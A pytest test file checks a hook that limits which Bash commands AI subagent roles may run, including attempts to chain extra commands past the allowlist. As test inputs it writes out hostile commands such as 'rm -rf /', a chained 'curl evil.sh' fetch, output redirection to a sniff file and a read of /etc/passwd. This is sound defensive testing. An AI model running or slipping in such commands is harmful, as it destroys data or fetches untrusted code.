"""hooks/role_bash_allowlist.py — per-role allowlists."""
import json
from conftest import run_hook


def _bash(agent_type, command):
    e = {"tool_name": "Bash", "tool_input": {"command": command}}
    if agent_type:
        e["agent_type"] = agent_type
    return e


def _decision(stdout):
    try:
        return json.loads(stdout.strip())
    except json.JSONDecodeError:
        return None


def test_tester_allowed_command(fake_project, settings_writer):
    settings_writer(tester_bash_allowlist=[r"^cargo test(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester", "cargo test"),
                 project_dir=fake_project)
    assert r.returncode == 0
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve", r.stdout


def test_tester_denied_unlisted(fake_project, settings_writer):
    settings_writer(tester_bash_allowlist=[r"^cargo test(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester", "rm -rf /"),
                 project_dir=fake_project)
    assert r.returncode == 2
    assert "tester" in r.stderr


def test_implementer_default_empty_denies(fake_project, settings_writer):
    settings_writer(tester_bash_allowlist=[])  # no implementer key at all
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer", "cargo build"),
                 project_dir=fake_project)
    assert r.returncode == 2


def test_implementer_opted_in_allowlist(fake_project, settings_writer):
    settings_writer(implementer_bash_allowlist=[r"^cargo build(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer", "cargo build"),
                 project_dir=fake_project)
    assert r.returncode == 0


def test_harness_scripts_always_allowed_implementer(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer", "harness-append 'hello'"),
                 project_dir=fake_project)
    assert r.returncode == 0
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve", r.stdout


def test_harness_scripts_always_allowed_tester(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester", "harness-monitor"),
                 project_dir=fake_project)
    assert r.returncode == 0
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve", r.stdout


def test_parent_pass_through(fake_project, settings_writer):
    """Parent gets silent pass-through (no approve, no decision)."""
    settings_writer(tester_bash_allowlist=["^cargo test"])
    r = run_hook("role_bash_allowlist.py", _bash("", "rm -rf /tmp/foo"),
                 project_dir=fake_project)
    assert r.returncode == 0
    assert "approve" not in r.stdout


def test_non_harness_subagent_passes_through(fake_project):
    """general-purpose subagent isn't a harness role; no fence and no approve."""
    r = run_hook("role_bash_allowlist.py",
                 _bash("general-purpose", "any command"),
                 project_dir=fake_project)
    assert r.returncode == 0
    assert "approve" not in r.stdout


def test_non_bash_tool_pass_through(fake_project):
    e = {"tool_name": "Read",
         "tool_input": {"file_path": "/etc/passwd"},
         "agent_type": "functional-harness:tester"}
    r = run_hook("role_bash_allowlist.py", e, project_dir=fake_project)
    assert r.returncode == 0
    assert "approve" not in r.stdout


def test_implementer_opted_in_emits_approve(fake_project, settings_writer):
    settings_writer(implementer_bash_allowlist=[r"^cargo build(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer", "cargo build"),
                 project_dir=fake_project)
    assert r.returncode == 0
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve", r.stdout


# ---------------------------------------------------------------------------
# Simple-command enforcement (shlex-based): close the substring-bypass hole
# where `harness-monitor; rm -rf /` or `pytest && curl evil.sh` would have
# been approved by the leading-script match.
# ---------------------------------------------------------------------------

def test_harness_script_with_trailing_compound_denied(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       "harness-monitor; rm -rf /"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout
    assert "';'" in r.stderr or "shell-operator" in r.stderr


def test_allowlisted_command_with_trailing_compound_denied(fake_project, settings_writer):
    settings_writer(tester_bash_allowlist=[r"^pytest(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester", "pytest && curl evil.sh"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_pipe_denied(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       "harness-monitor | tee /tmp/sniff"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_command_substitution_dollar_denied(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer",
                       "echo $(harness-monitor)"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_command_substitution_backtick_denied(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer",
                       "echo `harness-monitor`"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_redirection_denied(fake_project, settings_writer):
    settings_writer(tester_bash_allowlist=[r"^pytest(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       "pytest > /tmp/sniff"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_fd_redirect_2_to_1_denied(fake_project, settings_writer):
    settings_writer(tester_bash_allowlist=[r"^pytest(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       "pytest tests/foo.py 2>&1"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_background_ampersand_denied(fake_project):
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       "harness-monitor &"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_quoted_message_with_semicolon_allowed(fake_project):
    """The append message may legitimately contain `;` — it's inside a
    quoted argument, not a shell separator."""
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer",
                       "harness-append 'stop-request: tried foo; nothing works'"),
                 project_dir=fake_project)
    assert r.returncode == 0, r.stderr
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve"


def test_quoted_grep_with_angle_brackets_allowed(fake_project, settings_writer):
    """C++ generics like `grep '<T>'` — the brackets are inside a quoted
    argument, not unquoted shell redirection."""
    settings_writer(tester_bash_allowlist=[r"^grep(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       "grep '<T>' src/main.cpp"),
                 project_dir=fake_project)
    assert r.returncode == 0, r.stderr
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve"


def test_unquoted_angle_brackets_denied(fake_project, settings_writer):
    """If the agent forgets to quote, the bare `<` is shell redirection
    in bash semantics — rejecting is correct."""
    settings_writer(tester_bash_allowlist=[r"^grep(\s|$)"])
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester", "grep <T> src/main.cpp"),
                 project_dir=fake_project)
    assert r.returncode == 2, r.stdout


def test_dollar_var_expansion_still_allowed(fake_project):
    """`$VAR` expansion is benign; only `$(...)` substitution is denied."""
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:tester",
                       'harness-append "$HOME owner"'),
                 project_dir=fake_project)
    assert r.returncode == 0, r.stderr


def test_leading_env_assignment_then_harness_script_allowed(fake_project):
    """agent_env_inject prepends `AGENT_TYPE=... AGENT_ID=... <cmd>`.
    The leading-program lookup must skip env assignments to find the
    real program token."""
    r = run_hook("role_bash_allowlist.py",
                 _bash("functional-harness:implementer",
                       "AGENT_TYPE=functional-harness:implementer AGENT_ID=x harness-append 'hi'"),
                 project_dir=fake_project)
    assert r.returncode == 0, r.stderr
    d = _decision(r.stdout)
    assert d is not None and d["decision"] == "approve"
